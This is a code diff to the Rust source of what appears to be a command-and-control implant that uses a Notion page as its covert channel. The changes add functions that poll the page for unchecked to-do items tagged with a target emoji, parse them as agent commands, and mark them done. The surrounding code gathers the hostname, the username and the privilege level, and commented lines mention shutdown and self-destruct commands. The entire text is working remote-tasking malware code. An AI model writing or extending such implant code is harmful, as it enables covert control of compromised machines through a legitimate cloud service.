@@ -9,6 +9,7 @@ use async_trait::async_trait;
 use crate::logger::*;
 use crate::env_check::EnvCheck;
 use whoami::hostname;
+use crate::cmd::AgentCommand;
 use crate::cmd::getprivs::is_elevated;
 
 /// This is a Notion limitation
@@ -54,21 +55,16 @@ impl NotionChannel {
 
     ///
     /// Constructor for [NotionChannel]
+    /// The [NotionConfig] is coming in serialized because we've defined the types
+    /// all the way down. When the full config file is loaded from wherever it's loaded,
+    /// this struct will already exist and not need to be parsed here.
     /// 
-    async fn new(config_str: String, is_admin: bool) -> Result<NotionChannel, ChannelError> {
+    async fn new(config: NotionConfig, is_admin: bool) -> Result<NotionChannel, ChannelError> {
 
-        // Deserialize the JSON into a proper NotionConfig
-        if let Ok(config) = from_str::<NotionConfig>(&config_str) {
-            let logger = Logger::new(LOG_DEBUG);
-            
-            let client = NotionChannel::client(&config.api_key)?;
-            
-            Ok(NotionChannel {config, logger, client})
-
-        } else {
-            
-            Err(ChannelError::new("Could not load Notion Config"))
-        }
+        let logger = Logger::new(LOG_DEBUG);
+        
+        let client = NotionChannel::client(&config.api_key)?;
+        Ok(NotionChannel {config, logger, client})
 
     }
 
@@ -94,6 +90,28 @@ impl NotionChannel {
         )
     }
 
+    /// Retrieves blocks from Notion. All children blocks of the parent page returned
+    /// TODO: Account for pagination for > 100 children.
+    pub async fn get_blocks(self) -> Result<serde_json::Value, String> {
+        let page_id = self.config.page_id;
+        let url = format!("{URL_BASE}/blocks/{page_id}/children");
+
+        let r = self.client.get(url).send().await.unwrap();
+
+        if r.status().is_success() {
+            //println!("[*] Got blocks");
+            let blocks = r.json::<serde_json::Value>().await.unwrap();
+            match blocks.get("results") {
+                Some(bs) => {
+                    //println!("{:?}", bs);
+                    return Ok(bs.to_owned())
+                },
+                None => return Ok(json!([]))
+            }
+        }
+        Err(r.text().await.unwrap())
+    }
+
 }
 
 #[async_trait]
@@ -113,6 +131,9 @@ impl Channel for NotionChannel {
         let mut hn = hostname();
 
         let is_admin = is_elevated();  
+
+        self.logger.info(log_out!("Hostname: ", &hn));
+        self.logger.debug(format!("Config options: {:?}", self.config));
 
         // Get username
         let username = whoami::username();
@@ -166,6 +187,7 @@ impl Channel for NotionChannel {
         
         if r.status().is_success() {
             let res_body = r.json::<serde_json::Value>().await.unwrap();
+            self.config.page_id = res_body["id"].as_str().unwrap().to_string();
             return Ok(String::from(res_body["id"].as_str().unwrap()));
         }
 
@@ -217,8 +239,72 @@ impl Channel for NotionChannel {
         }
     }
 
-    async fn receive(self) -> Result<Value, ChannelError> {
-        Ok(json!({}))
+    /// Marks a job done by making the to-do item checked.
+    async fn complete(self, cmd: AgentCommand) -> () {
+        
+        // Set completed status
+        let block_id = cmd.rel;
+        let update_data = json!({
+            "to_do": {
+                "checked": true
+            }
+        });
+        let url = format!("{URL_BASE}/blocks/{block_id}");
+        let r = self.client
+            .patch(url)
+            .json(&update_data)
+            .send()
+            .await
+            .unwrap();
+
+        if !r.status().is_success() {
+            let result_text = r.text().await.unwrap();
+            self.logger.debug(result_text);
+        }
+    }
+
+    async fn receive(self) -> Result<Vec<AgentCommand>, ChannelError> {
+        let blocks = self.get_blocks().await.unwrap();
+
+        let command_blocks: Vec<&serde_json::Value> = blocks
+            .as_array()
+            .unwrap()
+            .into_iter()
+            .filter(|&b| b["type"] == "to_do")
+            .collect();
+
+        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
+            .into_iter()
+            .filter(|&b| b["to_do"]["checked"] == false)
+            .collect();
+
+        let mut new_commands: Vec<AgentCommand> = Vec::new();
+        for block in new_command_blocks {
+            match block["to_do"]["text"][0]["text"]["content"].as_str() {
+                Some(s) => {
+                    if s.contains("🎯") {
+                        self.logger.info(log_out!("Got command: ", s));
+                        let mut agent_command = AgentCommand::from_string(s.replace("🎯","")).unwrap();
+                        let command_block_id = block["id"].as_str().unwrap();
+                        // Insert the command block id into the `AgentCommand` as `.rel`
+                        agent_command.rel = command_block_id.to_string();
+                        new_commands.push(agent_command);
+                        // let output = notion_command.handle(&mut config_options, &logger).await?;
+                        // complete_command(&client, block.to_owned(), &logger).await;
+                        // send_result(&client, command_block_id, output, &logger).await;
+                        // // Check for any final work based on command type,
+                        // // Like shutting down the agent
+                        // match notion_command.command_type {
+                        //     CommandType::Shutdown => {exit(0);},
+                        //     CommandType::Selfdestruct => {exit(0)},
+                        //     _ => {}
+                        // }
+                    };
+                },
+                None => { continue; }
+            }
+        }
+        Ok(new_commands)
     }
 
     /// Produces a base64 encoded String of the Options.
